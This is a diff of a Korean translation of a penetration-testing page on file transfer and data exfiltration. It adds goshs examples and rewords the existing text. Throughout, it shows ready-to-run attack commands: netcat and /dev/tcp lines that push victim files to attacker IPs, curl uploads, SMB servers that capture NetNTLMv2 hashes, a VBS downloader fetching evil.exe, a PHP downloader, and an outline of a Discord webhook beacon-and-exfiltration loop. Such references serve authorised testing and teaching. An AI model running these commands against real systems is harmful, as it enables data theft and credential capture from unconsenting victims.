@@ -3,17 +3,17 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> 엔드투엔드 예제로 `C:\Users\Public`에 loot를 staging하고 Rclone으로 exfiltrating하여 합법적인 백업을 모방하는 워크플로를 보려면 아래를 검토하세요.
+> `C:\Users\Public`에 loot를 staging하고, Rclone으로 이를 exfiltrating하여 합법적인 backups를 모방하는 end-to-end 예시를 보려면, 아래 workflow를 검토하세요.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## 정보를 exfiltrate하기 위해 일반적으로 whitelisted된 도메인
+## 정보를 exfiltrate하기 위해 흔히 whitelisted된 domains
 
-남용될 수 있는 일반적으로 whitelisted된 도메인을 찾으려면 [https://lots-project.com/](https://lots-project.com/)을 확인하세요
+악용될 수 있는 흔히 whitelisted된 domains를 찾으려면 [https://lots-project.com/](https://lots-project.com/)을 확인하세요
 
-## 복사\&붙여넣기 Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -52,8 +52,8 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### 파일 업로드
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python 모듈 [uploadserver](https://pypi.org/project/uploadserver/):
+- [**GET과 POST(헤더도 포함)를 출력하는 SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- Python module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -66,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Server**
+### **HTTPS 서버**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -107,14 +107,47 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs)는 `python3 -m http.server`의 단일 바이너리 대체품으로,
+upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
+그리고 OOB collaboration 기능(DNS, SMTP, NTLM hash capture)을 제공합니다.
+```bash
+# Serve current directory on port 8000
+goshs
+
+# Serve with HTTPS (self-signed)
+goshs -s -ss
+
+# Serve with basic auth
+goshs -b user:password
+
+# Upload-only mode
+goshs -uo
+
+# Read-only mode
+goshs -ro
+
+# Capture SMB NTLM hashes
+goshs -smb -smb-domain CORP
+
+# DNS callback server
+goshs -dns -dns-ip 10.10.10.10
+
+# SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+
+# Tunnel via localhost.run (no port forwarding needed)
+goshs -tunnel
+```
 ## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks는 JSON과 선택적 파일 파트를 받는 쓰기 전용 HTTPS 엔드포인트입니다. 일반적으로 신뢰된 SaaS 도메인에 허용되며 OAuth/API 키가 필요하지 않아 마찰이 적은 beaconing 및 exfiltration에 유용합니다.
+Webhooks는 JSON과 선택적 file part를 받는 write-only HTTPS endpoint입니다. 이들은 보통 trusted SaaS domain에 허용되며 OAuth/API key가 필요 없어서, low-friction beaconing과 exfiltration에 유용합니다.
 
 Key ideas:
-- 엔드포인트: Discord uses https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data에서 payload_json이라는 파트에 {"content":"..."}를 포함해 전송하고, 선택적 file이라는 이름의 파일 파트(들)를 첨부할 수 있습니다.
-- Operator 루프 패턴: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK가 전달을 확인합니다.
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -185,8 +218,8 @@ Start-Sleep -Seconds 20
 }
 ```
 참고:
-- 유사한 패턴은 incoming webhooks를 사용하는 다른 협업 플랫폼(Slack/Teams)에도 적용됩니다; URL과 JSON schema를 적절히 조정하세요.
-- Discord Desktop 캐시 아티팩트의 DFIR 및 webhook/API 복구에 대해서는 다음을 참조하세요:
+- 유사한 패턴은 incoming webhooks를 사용하는 다른 협업 플랫폼(Slack/Teams)에도 적용된다; URL과 JSON schema를 그에 맞게 조정하라.
+- Discord Desktop cache artifacts 및 webhook/API 복구에 대한 DFIR는 다음을 보라:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -194,12 +227,12 @@ Start-Sleep -Seconds 20
 
 ## FTP
 
-### FTP 서버 (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP 서버 (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -235,14 +268,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali를 서버로
+Kali를 서버로 사용
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-또는 smb 공유를 **samba를 사용하여** 생성:
+또는 **samba**를 사용해 smb share를 생성하세요:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -265,28 +298,37 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
+### goshs
+[goshs](https://github.com/patrickhener/goshs)는 SMB를 통해 파일을 제공하고 연결하는 클라이언트로부터 NetNTLMv2 해시를 캡처하는 단일 바이너리 대안입니다:
+```bash
+# Start SMB server with NTLM hash capture
+goshs -smb -smb-domain CORP
+
+# Also works for plain HTTP file serving
+goshs
+```
 ## SCP
 
-공격자는 SSHd가 실행 중이어야 한다.
+공격자는 SSHd가 실행 중이어야 합니다.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-victim에 SSH가 있는 경우, attacker는 victim의 디렉토리를 attacker로 마운트할 수 있다.
+희생자가 SSH를 가지고 있다면, 공격자는 희생자의 디렉터리를 공격자 쪽에 마운트할 수 있다.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## 해당 없음
+## NC
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### victim으로부터 파일 다운로드
+### 피해자에서 파일 다운로드
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -298,7 +340,7 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-감사합니다 **@BinaryShadow\_**
+thanks to **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -320,22 +362,35 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-데이터를 SMTP 서버로 보낼 수 있다면, python으로 데이터를 수신하는 SMTP를 생성할 수 있습니다:
+SMTP 서버로 데이터를 보낼 수 있다면, python으로 데이터를 받을 수 있는 SMTP를 만들 수 있다:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs)는 OOB exfiltration 시나리오에서 이메일 콜백을 잡기 위해 빠르게 SMTP server를 띄울 수 있습니다:
+```bash
+# Start SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+```
+수신된 이메일과 callback은 터미널 출력에 직접 표시됩니다.
+전체 OOB 커버리지를 위해 DNS callback server와 결합할 수 있습니다:
+```bash
+# DNS + SMTP combined
+goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
+```
 ## TFTP
 
-XP와 2003에서는 기본적으로 포함되어 있음(다른 버전에서는 설치 중에 명시적으로 추가해야 함)
+기본적으로 XP와 2003에서(다른 버전에서는 설치 중에 명시적으로 추가해야 함)
 
-Kali에서는 **start TFTP server**:
+Kali에서, **TFTP server 시작**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**python으로 구현한 TFTP 서버:**
+**Python의 TFTP server:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
@@ -346,7 +401,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP 원라이너로 파일 다운로드:
+PHP oneliner로 파일을 다운로드하기:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -354,7 +409,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**피해자**
+**희생자**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -388,21 +443,22 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` 프로그램은 binaries를 검사할 수 있을 뿐만 아니라 **hex로부터 이를 재구성할 수 있는 기능**도 제공합니다. 즉, binary의 hex를 제공하면 `debug.exe`가 해당 binary 파일을 생성할 수 있습니다. 다만 debug.exe는 **최대 64 kb 크기의 파일까지만 assembling할 수 있다는 제한**이 있다는 점을 유의해야 합니다.
+`debug.exe` 프로그램은 바이너리를 검사할 수 있을 뿐만 아니라 **hex에서 다시 빌드하는 기능**도 있습니다. 즉, 바이너리의 hex를 제공하면 `debug.exe`가 바이너리 파일을 생성할 수 있습니다. 다만 `debug.exe`는 **64 kb 크기까지의 파일만 assembling할 수 있다는 제한**이 있다는 점이 중요합니다.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-그런 다음 텍스트를 windows-shell에 복사-붙여넣으면 nc.exe라는 파일이 생성됩니다.
+그런 다음 텍스트를 windows-shell에 복사-붙여넣기 하면 nc.exe라는 파일이 생성됩니다.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
 
-## 참고 자료
+## References
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
